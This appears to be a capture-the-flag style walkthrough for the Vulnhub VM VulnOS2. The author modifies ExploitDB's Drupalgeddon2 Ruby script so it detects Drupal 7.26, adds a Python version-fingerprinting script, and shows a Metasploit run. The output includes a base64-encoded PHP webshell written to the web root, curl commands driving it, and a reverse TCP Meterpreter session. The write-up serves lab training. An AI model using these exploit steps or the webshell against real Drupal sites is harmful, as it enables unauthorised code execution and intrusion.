# VulnOS2.0 Exploitation via Drupalgeddon2

I don't generally create extraneous walkthoughs for Vulnhub virtual machines if robust, accurate analyses and explanations already exist, as is the case for the OSCP-like VMs listed [here](https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms) and [here](https://medium.com/@andr3w_hilton/oscp-training-vms-hosted-on-vulnhub-com-22fa061bf6a1). On the other hand, I always like documenting less popular avenues of exploitation. 

For [VulnOS: 2](https://www.vulnhub.com/entry/vulnos-2,147/), there is extensive documentation on obtaining unprivileged shell access via the following steps:

1. Identifying the [SQLi vulnerability of the OpenDocMan software](https://www.exploit-db.com/exploits/32075/) running at the `/jabd0cs/` URI. 
2. Dumping the MySQL `user` table by using the OpenDocMan vulnerability (either manually or with `sqlmap`)
3. Cracking the `webin` user password hash (using `john` or a similar tool)
4. Logging in as the `webmin` user, via SSH, using the cracked password

However, there is another way.

Specifically, limited shell access can be obtained via the widely-publicized `Drupalgeddon2` exploit. Several of the aforementioned walkthoughs state that many of the `drupalgeddon` exploits listed on ExploitDB do not work out-of-the-box against VulnOS2; from my experience this seems true. That said, [the Ruby script 44449.rb](https://www.exploit-db.com/exploits/44449/) works with minor modifications.


## Exploit Analysis
If we run the exploit as-is, we see that it clearly fails. 

```bash
root@kali:Exploit$ echo '192.168.56.11 example.net' >> /etc/hosts
root@kali:Exploit$ ruby 44449.rb http://example.net/jabc/
ruby: warning: shebang line ending with \r may cause problems
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[*] Target : http://example.net/jabc/
--------------------------------------------------------------------------------
[!] MISSING: http://example.net/jabc/CHANGELOG.txt (404)
[!] MISSING: http://example.net/jabc/core/CHANGELOG.txt (404)
[+] Found  : http://example.net/jabc/includes/bootstrap.inc (200)
[+] Drupal!: can detect a matching directory
--------------------------------------------------------------------------------
[*] Testing: Code Execution
[*] Payload: echo YMNCMUIV
[!] Unsupported Drupal version
```

However, the output suggests that it this may be due to a failure to determine the Drupal version. 

Inspecting the code reveals the following lines, intended to fingerprint the Drupal installation.

```ruby
...
# Try and get version
$drupalverion = nil
# Possible URLs
url = [
  $target + "CHANGELOG.txt",
  $target + "core/CHANGELOG.txt",
  $target + "includes/bootstrap.inc",
  $target + "core/includes/bootstrap.inc",
]
# Check all
url.each do|uri|
  # Check response
  response = http_post(uri)
 
  if response.code == "200"
    puts "[+] Found  : #{uri} (#{response.code})"
 
    # Patched already?
    puts "[!] WARNING: Might be patched! Found SA-CORE-2018-002: #{url}" if response.body.include? "SA-CORE-2018-002"
 
    # Try and get version from the file contents
    $drupalverion = response.body.match(/Drupal (.*),/).to_s.slice(/Drupal (.*),/, 1).to_s.strip
 
    # If not, try and get it from the URL
    $drupalverion = uri.match(/core/)? "8.x" : "7.x" if $drupalverion.empty?
 
    # Done!
    break
  elsif response.code == "403"
    puts "[+] Found  : #{uri} (#{response.code})"
 
    # Get version from URL
    $drupalverion = uri.match(/core/)? "8.x" : "7.x"
  else
    puts "[!] MISSING: #{uri} (#{response.code})"
  end
end
...
```

Manual testing shows that any attempt to access 3 of the above `url`s returns a `404 Not Found`. While `/jabc/includes/bootstrap.inc` returns a `200 OK`, the script is unable to parse the version number.


## Solution 1
Although the script can't identify it, the version number actually exists in at least two places on the `/jabc/includes/bootstrap.inc` page, as shown below.

```php
...
/**
 * The current system version.
 */
define('VERSION', '7.26');

/**
 * Core API compatibility.
 */
define('DRUPAL_CORE_COMPATIBILITY', '7.x');
...
```

Currently, the script contains a single regex to identify the version number: `/Drupal (.*),/`. We can add two additional regexes - one for each of the above PHP statements, respectively.

```ruby
...
    $drupalverion = response.body.match(/VERSION\', \'([0-9]\.[0-9]{1,2})\'/).to_s.slice(/VERSION\', \'([0-9]\.[0-9]{1,2})\'/, 1).to_s.strip
    $drupalverion = response.body.match(/DRUPAL.*, \'([0-9]\.x)\'/).to_s.slice(/DRUPAL.*, \'([0-9]\.x)\'/, 1).to_s.strip if $drupalverion.empty?
    $drupalverion = response.body.match(/Drupal (.*),/).to_s.slice(/Drupal (.*),/, 1).to_s.strip if $drupalverion.empty?
...
```

Let's re-run the exploit,

```bash
root@kali:Exploit$ ruby 44449.rb http://example.net/jabc/
ruby: warning: shebang line ending with \r may cause problems
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[*] Target : http://example.net/jabc/
--------------------------------------------------------------------------------
[!] MISSING: http://example.net/jabc/CHANGELOG.txt (404)
[!] MISSING: http://example.net/jabc/core/CHANGELOG.txt (404)
[+] Found  : http://example.net/jabc/includes/bootstrap.inc (200)
[+] Drupal?: 7.26
--------------------------------------------------------------------------------
[*] Testing: Code Execution
[*] Payload: echo JSRNMUXQ
[+] Result : JSRNMUXQ
[{"command":"settings","settings":{"basePath":"\/jabc\/","pathPrefix":"","ajaxPageState":{"theme":"black","theme_token":"0pHnAh8gXGfhERMGgedKdhvov6luJGt0eyQTJj9xTjA"}},"merge":true},{"command":"insert","method":"replaceWith","selector":null,"data":"\u003Cdiv class=\u0022messages error\u0022\u003E\n\u003Ch2 class=\u0022element-invisible\u0022\u003EError message\u003C\/h2\u003E\n \u003Cul\u003E\n  \u003Cli\u003E\u003Cem class=\u0022placeholder\u0022\u003ENotice\u003C\/em\u003E: Undefined index: #value in \u003Cem class=\u0022placeholder\u0022\u003Efile_ajax_upload()\u003C\/em\u003E (line \u003Cem class=\u0022placeholder\u0022\u003E262\u003C\/em\u003E of \u003Cem class=\u0022placeholder\u0022\u003E\/var\/www\/html\/jabc\/modules\/file\/file.module\u003C\/em\u003E).\u003C\/li\u003E\n  \u003Cli\u003E\u003Cem class=\u0022placeholder\u0022\u003ENotice\u003C\/em\u003E: Undefined index: #suffix in \u003Cem class=\u0022placeholder\u0022\u003Efile_ajax_upload()\u003C\/em\u003E (line \u003Cem class=\u0022placeholder\u0022\u003E280\u003C\/em\u003E of \u003Cem class=\u0022placeholder\u0022\u003E\/var\/www\/html\/jabc\/modules\/file\/file.module\u003C\/em\u003E).\u003C\/li\u003E\n \u003C\/ul\u003E\n\u003C\/div\u003E\n","settings":{"basePath":"\/jabc\/","pathPrefix":"","ajaxPageState":{"theme":"black","theme_token":"0pHnAh8gXGfhERMGgedKdhvov6luJGt0eyQTJj9xTjA"}}}]
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: File Write To Web Root (./)
[*] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee ./s.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }[{"command":"settings","settings":{"basePath":"\/jabc\/","pathPrefix":"","ajaxPageState":{"theme":"black","theme_token":"Wcoww1A7RocAUFRXLWMCYEnHvZhsgVY-Z01AlhjKmxo"}},"merge":true},{"command":"insert","method":"replaceWith","selector":null,"data":"\u003Cdiv class=\u0022messages error\u0022\u003E\n\u003Ch2 class=\u0022element-invisible\u0022\u003EError message\u003C\/h2\u003E\n \u003Cul\u003E\n  \u003Cli\u003E\u003Cem class=\u0022placeholder\u0022\u003ENotice\u003C\/em\u003E: Undefined index: #value in \u003Cem class=\u0022placeholder\u0022\u003Efile_ajax_upload()\u003C\/em\u003E (line \u003Cem class=\u0022placeholder\u0022\u003E262\u003C\/em\u003E of \u003Cem class=\u0022placeholder\u0022\u003E\/var\/www\/html\/jabc\/modules\/file\/file.module\u003C\/em\u003E).\u003C\/li\u003E\n  \u003Cli\u003E\u003Cem class=\u0022placeholder\u0022\u003ENotice\u003C\/em\u003E: Undefined index: #suffix in \u003Cem class=\u0022placeholder\u0022\u003Efile_ajax_upload()\u003C\/em\u003E (line \u003Cem class=\u0022placeholder\u0022\u003E280\u003C\/em\u003E of \u003Cem class=\u0022placeholder\u0022\u003E\/var\/www\/html\/jabc\/modules\/file\/file.module\u003C\/em\u003E).\u003C\/li\u003E\n \u003C\/ul\u003E\n\u003C\/div\u003E\n","settings":{"basePath":"\/jabc\/","pathPrefix":"","ajaxPageState":{"theme":"black","theme_token":"Wcoww1A7RocAUFRXLWMCYEnHvZhsgVY-Z01AlhjKmxo"}}}]
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[*] Fake shell:   curl 'http://example.net/jabc/s.php' -d 'c=whoami'
VulnOSv2>> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

and now we have a prompt facilitating interaction with a webshell which, of course, runs as the unprivleged Apache `www-data` user. From here, we can escalate privileges via any of the methods detailed in the other walkthroughs.


## Solution 2
There is an additional location where we can check for the version number. Often, the HTML page at the root of the Drupal installation - which in the case of VulnOS2 resides at `/jabc/` - contains a `<meta/>` tag in the document `<head>` which conains the major version number. In our case, the full HTML element looks like this:

```html
...
<meta name="Generator" content="Drupal 7 (http://drupal.org)" />
...
```

Below is a simple Python3 script I've created which - given a Drupal URL - will identify the Drupal version based on this tag. 

```python
import re
import requests
import bs4
import sys
import urllib.parse

DRUPAL_VERSION_PATTERN = re.compile('Drupal ([0-9]+).*')


def get_drupal_version(url):
    scheme, netloc, path, params, query, frag = urllib.parse.urlparse(url)
    drupal_root = urllib.parse.urlunparse((scheme, netloc, path, '', '', ''))

    response = requests.get(drupal_root)
    response.raise_for_status()

    soup = bs4.BeautifulSoup(response.text, 'html.parser')

    try:
        version_tag = soup.head.find_all('meta',
                                         attrs={
                                             'name': 'Generator',
                                             'content': DRUPAL_VERSION_PATTERN,
                                         },
                                         recursive=False).pop()
        return DRUPAL_VERSION_PATTERN.match(version_tag['content']).groups()[0]
    except IndexError:
        raise Exception('Unable to determine Drupal version')
		

if __name__ == '__main__':
	drupal_version = get_drupal_version(sys.argv[1])
	print(drupal_version)
```

Running this script reveals that that Drupal major version is 7.

```bash
$ python3 get_drupal_version.py http://example.net/jabc/
7
```

Armed with this knowledge, we can further modify `44449.rb` to include the Drupal root URL - in our case `/jabc/` - in the list of `url`s.

```ruby
...
# Possible URLs
url = [
  $target + "CHANGELOG.txt",
  $target + "core/CHANGELOG.txt",
  $target + "includes/bootstrap.inc",
  $target + "core/includes/bootstrap.inc",
  $target
]
...
```

And now, even if none of the original URLs existed, we have additional location in which to check for the version. All we need to do is add another regex.

```ruby
...
    $drupalverion = response.body.match(/Drupal ([0-9])/).to_s.slice(/Drupal ([0-9])/, 1).to_s.strip if $drupalverion.empty?
...
```
(I verified this by removing all of the original URLs and re-running the exploit).


### Solution 3
The Metasploit Drupalgeddon2 module (`exploit/unix/webapp/drupal_drupalgeddon2`) works out-of-the-box. :)

```bash
msf > use exploit/unix/webapp/drupal_drupalgeddon2
msf exploit(unix/webapp/drupal_drupalgeddon2) > set RHOST 192.168.56.11
RHOST => 192.168.56.11
msf exploit(unix/webapp/drupal_drupalgeddon2) > set TARGETURI /jabc/
TARGETURI => /jabc/
msf exploit(unix/webapp/drupal_drupalgeddon2) > set VHOST example.net
VHOST => example.net
msf exploit(unix/webapp/drupal_drupalgeddon2) > run

[*] Started reverse TCP handler on 192.168.56.2:4444 
[*] Drupal 7 targeted at http://192.168.56.11/jabc/
[-] Could not determine Drupal patch level
[*] Sending stage (37775 bytes) to 192.168.56.11
[*] Meterpreter session 1 opened (192.168.56.2:4444 -> 192.168.56.11:48207) at 2018-08-10 19:33:39 -0400

meterpreter > getuid
Server username: www-data (33)
```
